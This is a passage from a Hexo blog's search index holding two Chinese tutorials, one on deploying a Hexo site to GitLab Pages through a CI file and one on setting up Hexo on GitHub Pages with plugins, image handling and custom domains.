text"></p><p>如果不关闭这个分支保护，会导致push不成功</p><h2 id="CI-CD配置文件"><a href="#CI-CD配置文件" class="headerlink" title="CI&#x2F;CD配置文件"></a>CI&#x2F;CD配置文件</h2><p>hexo项目根目录创建一个名为 <code>.gitlab-ci.yml</code> 的文件</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">node:20.12.2</span><br><br><span class="hljs-attribute">cache</span><span class="hljs-punctuation">:</span><br><span class="hljs-attribute">paths</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">node_modules/</span><br><br><span class="hljs-attribute">before_script</span><span class="hljs-punctuation">:</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">npm install hexo-cli -g</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">test -e package.json &amp;&amp; npm install</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">hexo generate</span><br><br><span class="hljs-attribute">pages</span><span class="hljs-punctuation">:</span><br><span class="hljs-attribute">script</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">hexo generate</span><br><span class="hljs-attribute">artifacts</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">paths</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">public</span><br><span class="hljs-attribute">only</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">main</span><br><br></code></pre></td></tr></table></figure><p>第一行的<code>node:xx</code>写上自己本地的node.js版本号，我这里是20.12.2，最后一行的<code>main</code>是分支名称</p><h1 id="推送发布"><a href="#推送发布" class="headerlink" title="推送发布"></a>推送发布</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git init<br>git add -A<br>git commit -m <span class="hljs-string">&quot;update&quot;</span><br>git remote add origin git@gitlab<span class="hljs-selector-class">.com</span>:helloworldbugs/helloworldbugs<span class="hljs-selector-class">.gitlab</span><span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.git</span><br>git push -u origin <span class="hljs-selector-tag">main</span> -f<br></code></pre></td></tr></table></figure><p>如果已经不是第一次推送，就可以用以下命令一键梭哈</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">git <span class="hljs-keyword">add</span> -A <span class="hljs-variable">&amp;&amp;</span> git commit -m <span class="hljs-string">&quot;update&quot;</span> <span class="hljs-variable">&amp;&amp;</span> git push<br></code></pre></td></tr></table></figure><p>在推送成功后，GitLab便会自动开始处理博客，等待2-3分钟即可，可到CI&#x2F;CD下查看任务进度情况。任务完成后便可通过<code>username.gitlab.io</code>访问博客页面。</p><blockquote><p>注意：之后添加博客文件都应直接采用git的管理方式，而不能使用<code>hexo g -d</code>。</p></blockquote><h1 id="问题及解决"><a href="#问题及解决" class="headerlink" title="问题及解决"></a>问题及解决</h1><ul><li><p>对于GitLab，如果仍按照Github的方式操作，会遇到CI&#x2F;CD的脚本执行失败，无法生成页面；如果选择.gitlab-ci.yml为HTML可以部署成功，但页面没有主题，显示混乱。因此换到了GitLab就按照GitLab的思路操作，不要在本地执行Hexo g -d，用git管理文件(可以在本地Hexo s预览)。</p></li><li><p>GitLab会在云端执行hexo g 后自动部署，无需在.gitlab-ci.yml中写入hexo d，因此可以在博客设置_config.yml中将deploy部分直接注释掉。当然不注释也没事，这些行不会起作用。</p></li><li><p>整个博客目录下的.gitignore中包含有node_modules&#x2F;、public&#x2F;、.deploy*&#x2F;目录，git push 时会自动忽略这些目录，推送到远程的只有scaffolds、source、themes目录下内容。</p></li><li><p>NexT主题的下的.gitignore中包含有外部库source&#x2F;lib&#x2F;*目录，因此git push时会忽略这些外部依赖库，比如facybox。最终会造成远程仓库不含这些依赖库，博客显示异常，注意移除这部分内容。</p></li><li><p>此外如果使用git clone 的方式下载的主题或外部库时，比如fancybox，需要手动删除对应的.git目录，因为在.git目录下最好不要出现.git目录，会提示 warning: adding embedded git repository: ….</p></li></ul><p>上述两个问题会造成NexT主题开启fancybox后，博客页面一片空白，无法正常显示。</p><ul><li><p>对于Hexo插件：直接在本地目录下安装插件后，package.json会自动修改，包含相应插件。因此直接在本地安装好全部扩展后，虽然node_modules&#x2F;不会上传到远程仓库，但在CI&#x2F;CD时npm install 会根据package.json文件内容自动安装全部所需插件及相关依赖，无需在.gitlab-ci.yml中一行行安装。</p></li><li><p>GitHub情况下，由于是在本地执行 hexo g -d ，对于软链接图片，会沿着链接找到原始图片资源，将其复制到要推送的public目录，并推送到仓库；对于GitLab，则是先推送再执行 hexo g ，推送到云端的只是一个链接文件(夹)，没有原始资源，最终不仅仅是图片无法显示，而是会在没有任何错误提示的情况下致使静态网页无法生成。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexoH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GitHub搭建Hexo</title>
    <link href="/2024/04/29/WEB/GitHub%E6%90%AD%E5%BB%BAHexo/"/>
    <url>/2024/04/29/WEB/GitHub%E6%90%AD%E5%BB%BAHexo/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着我的WordPress博客内容越写越多，对稳定性要求越来越高，自己的个人服务器上的也不晓得什么时候会暴毙，思虑再三下，决定把博客迁移到GitHub上，以hexo搭建一个静态博客，只要GitHub不倒，我的博客就不会倒，这样就永生不灭了。</p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><ol><li>git</li></ol><p><a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git config <span class="hljs-attr">--global</span> user<span class="hljs-selector-class">.name</span> <span class="hljs-string">&quot;你的GitHub用户名&quot;</span><br>git config <span class="hljs-attr">--global</span> user<span class="hljs-selector-class">.email</span> <span class="hljs-string">&quot;你的GitHub注册邮箱&quot;</span><br></code></pre></td></tr></table></figure><p>生成密钥文件</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">ssh-keygen -<span class="hljs-built_in">t</span> rsa -C <span class="hljs-string">&quot;你的GitHub注册邮箱&quot;</span><br></code></pre></td></tr></table></figure><p>密钥生成路径在：<code>C:\Users\&lt;user&gt;\.ssh</code></p><p><strong>打开GitHub配置keys</strong></p><p><a href="https://github.com/settings/keys">https://github.com/settings/keys</a></p><p>点右上角新建个keys，然后把<code>id_rsa.pub</code>这个公钥文件的内容粘贴进去就行</p><p><img src="/2024/04/29/WEB/GitHub%E6%90%AD%E5%BB%BAHexo/image-1.png" alt="Alt text"></p><p><strong>测试</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> -T git<span class="hljs-variable">@github</span>.com<br></code></pre></td></tr></table></figure><ol start="2"><li>node.js</li></ol><p><a href="https://nodejs.org/en/download/current">https://nodejs.org/en/download/current</a></p><p>直接默认安装就好</p><h1 id="hexo部署"><a href="#hexo部署" class="headerlink" title="hexo部署"></a>hexo部署</h1><ol><li>在线GitHub配置</li></ol><p>新建个公开仓库，命名方式有规范,</p><p>必须是<code>&lt;github_name&gt;.GitHub.io</code></p><ol start="2"><li>本地hexo配置</li></ol><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">npm <span class="hljs-keyword">install </span>hexo-cli -g<span class="hljs-comment"># 通过npm安装hexo命令包</span><br>hexo init <span class="hljs-keyword">blog</span><span class="hljs-comment"># 新建名为blog的Hexo项目骨架并初始化</span><br>cd <span class="hljs-keyword">blog</span><span class="hljs-comment"># 进入项目目录</span><br>npm <span class="hljs-keyword">install</span><span class="hljs-comment"># 根据项目根目录下的package.json，安装所有必须的Node.js依赖包</span><br></code></pre></td></tr></table></figure><ol start="3"><li>安装自动部署</li></ol><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install hexo-deployer-git <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><blockquote><p><code>--save</code> 加不加的区别在于是否写入到依赖文件<code>package.json</code>中</p></blockquote><p><strong>hexo常见命令汇总</strong></p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> install hexo -g <span class="hljs-comment">#安装Hexo</span><br><span class="hljs-built_in">npm</span> update hexo -g <span class="hljs-comment">#升级</span><br>hexo init <span class="hljs-comment">#初始化博客</span><br></code></pre></td></tr></table></figure><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs axapta">命令简写<br>hexo n <span class="hljs-string">&quot;我的博客&quot;</span> == hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;我的博客&quot;</span><span class="hljs-meta">#新建文章</span><br>hexo g == hexo generate<span class="hljs-meta">#生成本地静态文件</span><br>hexo s == hexo <span class="hljs-keyword">server</span><span class="hljs-meta">#启动本地服务预览</span><br>hexo d == hexo deploy<span class="hljs-meta">#部署</span><br></code></pre></td></tr></table></figure><p>hexo server相关命令</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs axapta">hexo <span class="hljs-keyword">server</span> <span class="hljs-meta">#Hexo会监视文件变动并自动更新，无须重启服务器</span><br>hexo <span class="hljs-keyword">server</span> -s <span class="hljs-meta">#静态模式</span><br>hexo <span class="hljs-keyword">server</span> -p <span class="hljs-number">5000</span> <span class="hljs-meta">#更改端口</span><br>hexo <span class="hljs-keyword">server</span> -i <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> <span class="hljs-meta">#自定义 IP</span><br>hexo clean <span class="hljs-meta">#清除网页缓存</span><br></code></pre></td></tr></table></figure><h2 id="hexo配置文件"><a href="#hexo配置文件" class="headerlink" title="hexo配置文件"></a>hexo配置文件</h2><p>需要修改配置文件<code>_config.yml</code>,在blog根目录</p><ol><li><p>修改<code>title:</code>为你的博客名称</p></li><li><p>修改<code>language: zh-CN</code></p></li><li><p>修改：<code>url:</code> 字段为你的博客域名，格式为<code>https://&lt;GitHub_name&gt;.github.io</code></p></li><li><p>在文件最底部添加以下信息</p></li></ol><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">deploy:</span><br><span class="hljs-symbol">type:</span> git<br><span class="hljs-symbol">repo:</span> &lt;这里填博客的GitHub仓库https链接，也可以用ssh的方式填&gt;<br><span class="hljs-symbol">branch:</span> main<br></code></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">hexo g  <span class="hljs-comment">//生成本地静态文件</span><br>hexo s  <span class="hljs-comment">//启动本地服务预览</span><br></code></pre></td></tr></table></figure><p>访问本地的4000端口：<a href="http://localhost:4000/">http://localhost:4000</a></p><p>测试通过以后就可以开始写文章了，文章目录：<code>hexo\blog\source\_posts</code></p><h2 id="推送发布"><a href="#推送发布" class="headerlink" title="推送发布"></a>推送发布</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">hexo clean<span class="hljs-comment">//清除网页缓存</span><br>hexo g<span class="hljs-comment">//生成本地静态文件</span><br>hexo d<span class="hljs-comment">//推送发布</span><br></code></pre></td></tr></table></figure><p>正常本地预览，直接执行<code>hexo s</code>,如果要发布话最好先执行<code>clean</code>命令，会去删除生成的<code>public</code>文件，完整部署命令: <code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code>。或者直接 <code>hexo d -g</code></p><h1 id="优化配置"><a href="#优化配置" class="headerlink" title="优化配置"></a>优化配置</h1><h2 id="图片配置"><a href="#图片配置" class="headerlink" title="图片配置"></a>图片配置</h2><ol><li>配置文件</li></ol><p>hexo的图片默认不能用md自带的语法进行本地解析，需要打开配置文件<code>_config.yml</code></p><p>修改<code>post_asset_folder</code> 默认是<code>fales</code>，改为<code>true</code>就行</p><p><img src="/2024/04/29/WEB/GitHub%E6%90%AD%E5%BB%BAHexo/image-2.png" alt="Alt text"></p><ol start="2"><li>添加插件</li></ol><p>安装插件<code>hexo-asset-image</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">npm install https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/xcodebuild/</span>hexo-asset-image.git --save<br></code></pre></td></tr></table></figure><p>以后每次新建文章都会在<code>_posts</code>目录下新建一个同名文件夹，把图片丢在那个文件夹里，然后再在markdown文件里引用他就好了</p><h2 id="设置VS-Code-中-Markdown粘贴图片的位置"><a href="#设置VS-Code-中-Markdown粘贴图片的位置" class="headerlink" title="设置VS Code 中 Markdown粘贴图片的位置"></a>设置VS Code 中 Markdown粘贴图片的位置</h2><p>PS</p><blockquote><p>使用VS Code中的 <code>markdown.copyFiles.destination</code> 配置项，可以设置粘贴图片的位置。</p></blockquote><p>VS Code内置了markdown编辑器非常好用，但是默认情况下，VS Code会将粘贴的图片放在markdown文件的同级目录下，这样不符合hexo的规范，hexo的文章无法链接到图片。</p><p>其实只需要简单的设置一下，就可以解决这个问题，省略很多不必要的步骤。</p><ol><li>在VS Code中，按下<code>Ctrl + ,</code>，打开设置界面。</li><li>在搜索框中输入<code>markdown copy</code>, 找到<code>Markdown&gt; Copy Files:Destination</code>位置</li><li>新增配置项 key 为 <code>**/*.md</code>, value 为 <code>$&#123;documentBaseName&#125;/$&#123;fileName&#125;</code></li></ol><blockquote><p>其中 <code>$&#123;documentBaseName&#125;</code> 表示markdown文件的文件名，<code>$&#123;fileName&#125;</code> 表示图片的文件名。</p></blockquote><p><img src="/2024/04/29/WEB/GitHub%E6%90%AD%E5%BB%BAHexo/image-3.png" alt="Alt text"></p><p>这样以后每次写hexo文章都只需要将图片图片直接在VS Code里粘贴就可以了。</p><h2 id="自动生成-categories"><a href="#自动生成-categories" class="headerlink" title="自动生成 categories"></a>自动生成 categories</h2><h3 id="插件说明"><a href="#插件说明" class="headerlink" title="插件说明"></a>插件说明</h3><p><code>hexo-directory-category</code> 插件，它根据每个帖子的文件夹结构自动生成类别。</p><p>最常用的文件管理策略，就是利用文件系统目录结构(树形结构 directory-tree)。<br>同样，为了便于管理大量的日志文件，采用目录结构是一种简便可行的方案。hexo-auto-category根据日志文件(Markdown)所在文件目录自动分类，即自动生成markdown的front-matter中的categories变量。</p><blockquote><p>同样效果的还有<a href="https://github.com/xu-song/hexo-auto-category">hexo-auto-category</a>插件。这个插件知名度最高，但是这个插件年久失修，已经近乎失效了。还有功能更齐全的<a href="https://github.com/sisyphsu/hexo-enhancer">hexo-enhancer</a>插件，这个插件可以生成所有的Front-matter，可自行测试。</p></blockquote><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>对于博客 source&#x2F;_post&#x2F;web&#x2F;framework&#x2F;hexo.md，该插件会自动生成以下categories</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">categories</span>:<br><span class="hljs-literal">-</span> web<br><span class="hljs-literal">-</span> framework<br></code></pre></td></tr></table></figure><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">npm install hexo-<span class="hljs-built_in">directory</span>-category <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><p>在站点根目录下的_config.yml添加：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">auto_dir_categorize:</span><br><span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span>    <span class="hljs-comment"># 启用插件。默认为 true 。</span><br><span class="hljs-attr">force:</span> <span class="hljs-literal">false</span>    <span class="hljs-comment"># 覆盖文章的前题类别，即使它有选项类别。默认为 false。</span><br></code></pre></td></tr></table></figure><h2 id="域名配置"><a href="#域名配置" class="headerlink" title="域名配置"></a>域名配置</h2><ol><li>添加 <code>CNAME</code> 文件位于目录 <code>/source</code> 下，文件内容为hexo的域名</li><li>添加域名解析 <code>CNAME</code> 类型到hexo的域名</li><li>GitHub配置 <code>Settings-&gt;GitHub Pages-&gt;Custom domain</code> 添加hexo的域名</li></ol><h2 id="其它说明"><a href="#其它说明" class="headerlink" title="其它说明"></a>其它说明</h2><ul><li>Hexo 默认会把 <code>source/</code> 目录下的“非可渲染”文件（例如图片、HTML、配置文件等）原样拷贝到 <code>public/</code>目录下，</li><li><code>source/</code> 目录下的可渲染文件（例如Markdown文件）会被渲染成HTML文件并保存在 <code>public/</code> 目录下</li><li><code>public/</code> 目录下的文件会被部署到 GitHub Pages</li></ul><p>所以，如果有本地服务器解析的需求，配置了 <code>web.config</code>以及<code>.htaccess</code> 等配置文件在<code>public/</code>目录下。执行<code>hexo clean &amp;&amp; hexo g</code>后，会先把<code>public/</code>目录删除后重新生成，本地配置的文件会失效。可以把需要配置的文件复制到 <code>source/</code> 目录下。这样，每次运行 <code>hexo d</code> 命令时，都会从<code>source/</code>目录下把配置文件复制到<code>public/</code>目录。</p>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexoH</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
